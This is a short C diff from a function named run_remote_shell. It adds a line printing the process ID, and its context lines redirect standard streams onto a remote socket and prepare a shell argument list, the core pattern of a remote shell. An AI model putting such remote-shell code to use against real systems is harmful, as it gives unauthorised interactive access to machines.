@@ -101,6 +101,8 @@ void run_remote_shell(void) {
     dup2(remote_sock, 1);
     dup2(remote_sock, 2);
 
+    printf("Shell PID: %d\n", getpid());
+
     const char* sh[2];
     sh[0] = "crash_test_dummy";
     sh[1] = NULL;
